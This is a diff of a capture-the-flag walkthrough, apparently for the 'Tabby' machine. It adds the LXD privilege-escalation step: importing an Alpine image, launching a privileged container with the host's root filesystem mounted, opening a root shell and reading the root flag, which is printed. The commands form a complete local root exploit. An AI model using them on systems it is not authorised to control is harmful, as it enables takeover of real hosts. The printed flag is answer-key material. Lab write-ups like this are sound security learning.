@@ -544,7 +544,13 @@ To start your first instance, try: lxc launch ubuntu:18.04
 +------+-------+------+------+------+-----------+
 ```
 
-Clone alpine builder; fix builder; build alpine.
+We can use Alpine, a lightweight Linux distro. 
+
+Easy way to do this is use alpine builder, which will download the latest version of Alpine then create an LXC image.
+
+1. Clone Alpine builder; 
+2. Fix the builder; 
+3. Build Alpine.
 
 ```
 # Clone
@@ -604,8 +610,146 @@ alpine-v3.12-x86_64 100%[===================>]   3.06M   731KB/s    in 4.3s
 2020-09-27 21:11:09 (731 KB/s) - ‘alpine-v3.12-x86_64-20200927_2146.tar.gz’ saved [3207041/3207041]
 ```
 
-## LXD privesc after downloading image
+## Import LXD image
 
+Import image
+
+```shell
+ash@tabby:~/alpine$ lxc image import alpine-v3.12-x86_64-20200927_2146.tar.gz --alias loveless
+<-v3.12-x86_64-20200927_2146.tar.gz --alias loveless
+ash@tabby:~/alpine$ lxc image list
+lxc image list
++----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
+|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
++----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
+| loveless | 9aa953736e7a | no     | alpine v3.12 (20200927_21:46) | x86_64       | CONTAINER | 3.06MB | Sep 27, 2020 at 9:22pm (UTC) |
++----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
+```
+
+## Initialise LXD
+
+Initialize LXD, and create storage device. Select all default options.
+
+```shell
+ash@tabby:~/alpine$ lxd init
+lxd init
+Would you like to use LXD clustering? (yes/no) [default=no]: 
+Do you want to configure a new storage pool? (yes/no) [default=yes]: 
+Name of the new storage pool [default=default]: mystorage
+mystorage
+Name of the storage backend to use (ceph, btrfs, dir, lvm) [default=btrfs]: 
+Create a new BTRFS pool? (yes/no) [default=yes]: 
+Would you like to use an existing block device? (yes/no) [default=no]: 
+Size in GB of the new loop device (1GB minimum) [default=15GB]: 
+Would you like to connect to a MAAS server? (yes/no) [default=no]: 
+Would you like to create a new local network bridge? (yes/no) [default=yes]: 
+What should the new bridge be called? [default=lxdbr0]: 
+What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+Would you like LXD to be available over the network? (yes/no) [default=no]: 
+Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
+Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
+```
+
+## Launch LXC container
+
+Launch the image with privileged security flag.
+
+```shell
+ash@tabby:~/alpine$ lxc init loveless lovelesscontainer -c security.privileged=true 
+<less lovelesscontainer -c security.privileged=true 
+Creating lovelesscontainer
+```
+
+Create some storage device for the container; mount the victim machines `/root` directory to device.
+
+```shell
+lxc config device add lovelesscontainer host-root disk source=/ path=/mnt/root recursive=true
+```
+
+Start the container, then execute shell on the security privileged, root-bound, container.
+
+```shell
+ash@tabby:~/alpine$ lxc start lovelesscontainer
+lxc start lovelesscontainer
+```
+## Get root shell from container
+
+Execute /bin/sh command on container and get root shell
+
+```shell
+ash@tabby:~/alpine$ lxc exec lovelesscontainer /bin/sh
+lxc exec lovelesscontainer /bin/sh
+~ # ^[[38;5R
+
+~ # ^[[38;5Rwhoami
+whoami
+root
+
+```
+
+## Get root flag
+
+```shell
+cd /mnt
+/mnt # ^[[38;8Rls -lah
+ls -lah
+total 4K     
+drwxr-xr-x    1 root     root           8 Sep 27 21:42 .
+drwxr-xr-x    1 root     root         114 Sep 27 21:42 ..
+drwxr-xr-x   20 root     root        4.0K May 19 10:28 root
+/mnt # ^[[38;8Rcd root
+cd root
+/mnt/root # ^[[38;13Rls -lah
+ls -lah
+total 2G     
+drwxr-xr-x   20 root     root        4.0K May 19 10:28 .
+drwxr-xr-x    1 root     root           8 Sep 27 21:42 ..
+lrwxrwxrwx    1 root     root           7 Apr 23 07:32 bin -> usr/bin
+drwxr-xr-x    3 root     root        4.0K May 19 10:28 boot
+drwxr-xr-x    2 root     root        4.0K May 19 10:27 cdrom
+drwxr-xr-x   17 root     root        3.9K Sep 27 19:46 dev
+drwxr-xr-x  101 root     root        4.0K Jun 17 16:22 etc
+drwxr-xr-x    3 root     root        4.0K Jun 16 13:32 home
+lrwxrwxrwx    1 root     root           7 Apr 23 07:32 lib -> usr/lib
+lrwxrwxrwx    1 root     root           9 Apr 23 07:32 lib32 -> usr/lib32
+lrwxrwxrwx    1 root     root           9 Apr 23 07:32 lib64 -> usr/lib64
+lrwxrwxrwx    1 root     root          10 Apr 23 07:32 libx32 -> usr/libx32
+drwx------    2 root     root       16.0K May 19 10:26 lost+found
+drwxr-xr-x    2 root     root        4.0K Sep 27 20:53 media
+drwxr-xr-x    2 root     root        4.0K Apr 23 07:32 mnt
+drwxr-xr-x    3 root     root        4.0K May 19 22:27 opt
+dr-xr-xr-x  213 root     root           0 Sep 27 19:46 proc
+drwx------    6 root     root        4.0K Jun 16 13:59 root
+drwxr-xr-x   29 root     root         860 Sep 27 20:00 run
+lrwxrwxrwx    1 root     root           8 Apr 23 07:32 sbin -> usr/sbin
+drwxr-xr-x    6 root     root        4.0K May 19 10:41 snap
+drwxr-xr-x    2 root     root        4.0K Apr 23 07:32 srv
+-rw-------    1 root     root        2.0G May 19 10:28 swap.img
+dr-xr-xr-x   13 root     root           0 Sep 27 19:46 sys
+drwxrwxrwt   14 root     root        4.0K Sep 27 21:39 tmp
+drwxr-xr-x   14 root     root        4.0K Apr 23 07:34 usr
+drwxr-xr-x   14 root     root        4.0K May 21 10:31 var
+/mnt/root # ^[[38;13Rcd root
+cd root
+/mnt/root/root # ^[[38;18Rls -lah
+ls -lah
+total 40K    
+drwx------    6 root     root        4.0K Jun 16 13:59 .
+drwxr-xr-x   20 root     root        4.0K May 19 10:28 ..
+lrwxrwxrwx    1 root     root           9 May 21 20:30 .bash_history -> /dev/null
+-rw-r--r--    1 root     root        3.0K Dec  5  2019 .bashrc
+drwx------    2 root     root        4.0K May 19 22:23 .cache
+drwxr-xr-x    3 root     root        4.0K May 19 11:50 .local
+-rw-r--r--    1 root     root         161 Dec  5  2019 .profile
+-rw-r--r--    1 root     root          66 May 21 13:46 .selected_editor
+drwx------    2 root     root        4.0K Jun 16 14:00 .ssh
+-rw-r--r--    1 root     root          33 Sep 27 19:47 root.txt
+drwxr-xr-x    3 root     root        4.0K May 19 10:41 snap
+/mnt/root/root # ^[[38;18Rcat root.txt
+cat root.txt
+6038974abd11ed568d557523c91ace89
+```
 
 
 
